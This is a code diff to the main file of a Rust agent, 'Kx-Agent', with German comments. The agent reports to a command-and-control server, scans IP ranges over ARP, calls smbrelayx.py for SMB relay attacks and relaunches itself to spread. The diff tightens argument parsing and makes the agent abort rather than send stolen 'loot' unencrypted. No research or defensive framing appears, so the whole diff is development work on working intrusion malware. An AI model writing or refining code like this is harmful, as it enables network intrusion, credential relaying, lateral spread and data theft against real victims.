@@ -16,6 +16,7 @@ mod meldung;
 mod propagate;
 mod tasks;
 
+use std::net::Ipv4Addr;
 use std::path::PathBuf;
 
 use clap::Parser;
@@ -74,17 +75,20 @@ struct Args {
     #[arg(long, default_value = "eth0")]
     iface: String,
     /// Start-IP des Scan-Bereichs.
+    ///
+    /// Der Typ prueft die Adresse beim Parsen: eine unbrauchbare IP bricht den
+    /// Lauf schon an der Kommandozeile ab, nicht mitten im Agenten-Thread.
     #[arg(long)]
-    start: String,
+    start: Ipv4Addr,
     /// End-IP des Scan-Bereichs.
     #[arg(long)]
-    end: String,
+    end: Ipv4Addr,
     /// Eigene IP für ARP-Anfragen.
     #[arg(long, default_value = "192.168.1.100")]
-    own_ip: String,
+    own_ip: Ipv4Addr,
     /// Vorkonfigurierte Host-Liste (kommagetrennt) — umgeht ARP.
-    #[arg(long)]
-    hosts: Option<String>,
+    #[arg(long, value_delimiter = ',')]
+    hosts: Option<Vec<Ipv4Addr>>,
     /// Pfad zu smbrelayx.py.
     #[arg(long, default_value = "assets/smbrelayx.py")]
     relay_script: String,
@@ -125,17 +129,25 @@ impl Args {
             "--iface".to_string(),
             self.iface.clone(),
             "--start".to_string(),
-            self.start.clone(),
+            self.start.to_string(),
             "--end".to_string(),
-            self.end.clone(),
+            self.end.to_string(),
             "--own-ip".to_string(),
-            self.own_ip.clone(),
+            self.own_ip.to_string(),
         ];
         // Ohne diese Liste scannt der neu gestartete Agent den ganzen Bereich
         // statt der ursprünglichen Ziele.
         if let Some(hosts) = &self.hosts {
             args.push("--hosts".to_string());
-            args.push(hosts.clone());
+            // Die Liste wird kommagetrennt uebergeben — so wie sie auch
+            // hereinkommt.
+            args.push(
+                hosts
+                    .iter()
+                    .map(|ip| ip.to_string())
+                    .collect::<Vec<_>>()
+                    .join(","),
+            );
         }
         if let Some(schluessel) = &self.server_key {
             args.push("--server-key".to_string());
@@ -168,21 +180,26 @@ async fn main() {
     let args = Args::parse();
     info!("Kx-Agent startete, C2={}", args.server);
 
-    // Der Server-Schluessel decides, ob die Beute verschluesselt gemeldet
-    // wird. Fehlt er, laeuft der Agent ohne Schluesselmaterial weiter.
-    let sealer = args
-        .server_key
-        .as_deref()
-        .and_then(|pfad| match hostkey::KeySealer::load(pfad) {
+    // Der Server-Schluessel entscheidet, ob die Beute verschluesselt gemeldet
+    // wird. Fehlt die Option, laeuft der Agent ohne Schluesselmaterial weiter.
+    //
+    // Wurde die Option **gegeben** und laesst sich die Datei nicht lesen,
+    // bricht der Lauf ab: ein stiller Rueckfall auf Klartext waere genau das
+    // Gegenteil dessen, was der Operator verlangt hat. Die Beute bleibt dann
+    // auf dem Zielhost, und der naechste Lauf meldet sie erneut.
+    let sealer = match args.server_key.as_deref() {
+        Some(pfad) => match hostkey::KeySealer::load(pfad) {
             Ok(s) => {
                 info!("Server-Schluessel geladen, die Beute wird versiegelt gemeldet");
                 Some(s)
             }
             Err(e) => {
-                error!("Server-Schluessel unbrauchbar: {e}");
-                None
+                error!("Server-Schluessel unbrauchbar: {e} — der Lauf bricht ab, die Beute wird nicht im Klartext gemeldet");
+                std::process::exit(1);
             }
-        });
+        },
+        None => None,
+    };
 
     let client = match c2::C2Client::new(&args.server, args.token.as_str(), &args.server_cert) {
         Ok(c) => c,
@@ -237,9 +254,9 @@ mod tests {
             server: "https://127.0.0.1:8443".into(),
             token: Secret::from(token),
             iface: "eth0".into(),
-            start: "192.168.1.1".into(),
-            end: "192.168.1.10".into(),
-            own_ip: "192.168.1.100".into(),
+            start: "192.168.1.1".parse().unwrap(),
+            end: "192.168.1.10".parse().unwrap(),
+            own_ip: "192.168.1.100".parse().unwrap(),
             hosts: None,
             relay_script: "assets/smbrelayx.py".into(),
             server_cert: "/tmp/kx-server.crt".into(),
